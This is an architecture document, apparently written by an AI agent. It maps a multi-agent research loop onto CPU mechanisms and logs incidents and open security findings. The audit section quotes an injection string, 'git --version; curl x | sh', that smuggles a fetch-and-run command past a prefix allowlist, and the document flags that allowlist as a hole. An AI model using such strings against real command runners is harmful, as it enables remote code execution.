# Architecture — the agent system as a heterogeneous out-of-order multicore

Design philosophy: **don't reinvent orchestration; port the microarchitecture.** Computer
architecture is an exhausted, optimized design space. Rather than invent multi-agent folklore,
each coordination problem here is solved by the CPU mechanism that already solves it. The pieces
in `agent_bus/` are those mechanisms.

## The cores (heterogeneous, big.LITTLE)

| Core | Role | Cost | Runs |
|---|---|---|---|
| **Fable** (Claude Opus) | P-core / control unit | highest | decomposition, decision gates, interpretation, **verdicts**, in-order retirement |
| **Codex** | mid core + independent reviewer | mid | autonomous implementation, experiment execution, cross-checking Fable's logic |
| **Sonnet** (sub-agents) | E-cores | low | spec'd code + tests, parallel fan-out |
| **Qwen3-8B** (local) | DMA / coprocessor | ~free | deterministic eval + regression runs, offloaded bulk work |

Scheduling rule: route each task to the **lowest tier whose judgment bar it clears.** That is the
whole "delegate to the most efficient model" requirement — a heterogeneous multicore scheduler.

## The substrate (what is built)

Three files, three classic regions:

| File | CPU analog | Purpose |
|---|---|---|
| `cache.py` → `SHARED.md` | coherent shared cache (MESI) | shared *state*: versioned keys, compare-and-set, claim/release line ownership |
| `board.py` → `BOARD.md` | scoreboard + reorder buffer | the *task queue*: out-of-order issue, dependency gating, in-order retirement, speculation flags |
| `scheduler.py` | OS scheduler + core | the *driver*: heterogeneous dispatch, speculative execution + branch prediction, cost governor, watchdog |
| `bus.py` → `CHANNEL.md` | interconnect / bus | the *message stream*: acks, questions, result reports |

Rule of thumb: **state → cache, tasks → board, narration → bus.** The scheduler runs the loop over
all three via an `Executor` interface (`SimExecutor` for dry runs; real executors — a Sonnet
sub-agent, a `codex exec` call, a local Qwen run — drop in behind the same interface).

## The mechanisms (and the problem each solves)

- **Scoreboard (`board next`)** — a task issues when its `deps` are satisfied, so a younger ready
  task runs while an older blocked one waits. Extracts parallelism from a dependency graph.
- **Heterogeneous dispatch (`tier`)** — every task names which core class may run it.
- **Dual-modular redundancy (`board review`, reviewer ≠ owner)** — cross-check by a *different
  core, ideally a different model family*, before a task is `verified`. Uncorrelated blind spots;
  this is what caught both real bugs so far (Codex's honest refutation; Fable's harness-artifact
  catch). This is ECC/lockstep, not a nicety.
- **Reorder buffer (`board retire`, Fable-only, in `seq` order)** — tasks execute out of order for
  speed, but verdicts **commit in program order** through Fable. This reconciles maximum
  parallelism with research integrity: the graveyard record stays consistent even though execution
  was parallel. *This is the load-bearing idea.*
- **Watchdog (`board watchdog`)** — a claimed-but-stale task is reclaimed so a crashed core can't
  deadlock the pipeline.
- **Interrupts** — human checkpoints and a cost ceiling are high-priority IRQs that preempt the
  loop. Never masked for verdicts or frontier spend.

## The loop as a pipeline

One research iteration is a classic 4-stage pipeline; different cores occupy different stages at
once, so stages overlap in time:

```
FETCH            DECODE                 EXECUTE                    RETIRE
pick next idea → Fable writes a spec  → worker runs (OOO,       → Fable commits the verdict
(memory docs)    + acceptance + tier    parallel) + cross-check    in seq order (graveyard)
```

Stop conditions (loop exits, not runs forever): board empty of `ready` tasks, max-iterations, or
cost ceiling tripped. Verdicts and frontier-model spend always require the human IRQ.

## Built vs. frontier

**Built and tested** (`tests/test_scheduler.py`, dry-run verified end-to-end):
- **Speculative execution + branch prediction** (`scheduler.py`). At a gate, the predictor guesses
  the outcome and lets dependent work run ahead on cheap E-cores; correct → `commit`, wrong →
  `squash`. Demonstrated: a mispredicted gate squashed its speculative follow-on while the correct
  branch committed and retired.
- **Cost governor** — pre-admission control: a core is not dispatched unless its estimated cost
  fits the remaining budget; crossing it trips a maskable interrupt (spend is on `SHARED.md`).
- **Heterogeneous scheduling + watchdog** — per-tier capacities; stale claims reclaimed.
- **Register renaming / hazard avoidance** — the cache's versioning + CAS prevent WAW/RAW hazards.

**Coordination hardening (lessons from a real collision, 2026-07-10):**
- A Sonnet worker overwrote Codex's v2.1 source files (no lock, and the repo had no commits to
  recover from) — a lost update at the *file* level, the same class Codex flagged for the cache.
- Fixed: `cache.py` now takes a cross-process OS lock (fcntl/msvcrt) around every read-modify-write,
  so two real drivers cannot lose a cache update (`tests/test_agent_cache` concurrency test).
- Since closed: the **board** takes the same cross-process lock on every mutation (`board.py`
  `_lock`); **claim-before-edit** exists as transactional file leases (`workspace.py`, all-or-none);
  the repo **commits**. All three are tested.

**Still owed (audited 2026-07-17 — the previous list was stale and cost a re-audit):**
- **The legacy shell path's allowlist is theatre.** `CommandPolicy.validate` correctly rejects
  shell control tokens on the *typed argv* path — but the legacy path checks `cmd.startswith(prefix)`
  and hands the raw string to `subprocess.run(..., shell=True)`. `"git --version; curl x | sh"`
  passes. Worse, the constructor defaults `allow_legacy_shell=True`; only `run_loop.py` opts out.
  ARCHITECTURE's own threat model ("needs an allowlist before a model may populate that field") is
  the one this doesn't meet.
- **Cost governor is elapsed seconds, not tokens/dollars.** Real metering is still owed.

**Bridge hot loop (a real incident, 2026-07-17):** a corrupt `~/.codex/rules` (a NUL-filled tail
from a killed mid-append write) made every `codex exec` exit 1 at startup. `codex_bridge.py` printed
"not committing" and re-dispatched the same ready task **every poll, forever** — no failure count,
no backoff, no ceiling. Two lessons, both now fixed in `codex_bridge.py`:
- We had named the right mechanism and applied it in one direction only. The board's **watchdog**
  handles a crashed core deadlocking a *claimed* task; nothing handled a broken core hot-looping a
  *ready* one. `DispatchGuard` is that missing half (per-task backoff → quarantine; global
  consecutive failures → halt, because a harness fault must outrank blaming one innocent task).
- **The bridge bypassed the `Governor` entirely** — the one component that spawns paid processes in
  an unbounded loop was the only one with no budget ceiling, importing `GitCommitter` from
  `scheduler.py` while leaving the governor next to it untouched. Now wired (`BridgeGovernor`, on
  bridge-owned cache lines so two drivers don't contend).

**The habit worth naming (three instances in one day, 2026-07-16/17):** we build the safety
mechanism and don't wire it to the thing that needs it — the cache's sampling bypass treats an
absent `temperature` as safe, `allow_legacy_shell` defaults `True`, the bridge had no ceiling
though `Governor` was one import away. New safety mechanisms ship **enforcing**; opting out is
explicit.

**Frontier (next):**
- **Real executors** behind the `Executor` interface: a Sonnet sub-agent, `codex exec`, a local
  Qwen run — this is what turns the dry loop into a live self-improving loop.
- **A smarter branch predictor** — history-based (did similar gates pass before?) instead of
  predict-always-taken.
- **Prefetch** — while a run executes, warm the cache with the next stage's likely context.
- **Memory hierarchy + eviction** — context (registers) → cache (L2/L3) → memory docs (RAM) → git
  (disk); Brain Runtime's decay is the eviction policy.

## Honest ceiling

Neither Claude nor Codex is a daemon; each runs in discrete turns driven by a human, a scheduler,
or `codex exec`. So the board is **driver-agnostic**: any driver (manual, a Claude `/loop`, or a
Codex headless loop) reads the same scoreboard and obeys the same hazards. Full-auto = two drivers
running at once over one board — the coherence, cross-check, and in-order-retirement invariants make
that safe rather than chaotic.

— Fable (Claude Opus 4.8), 2026-07-09
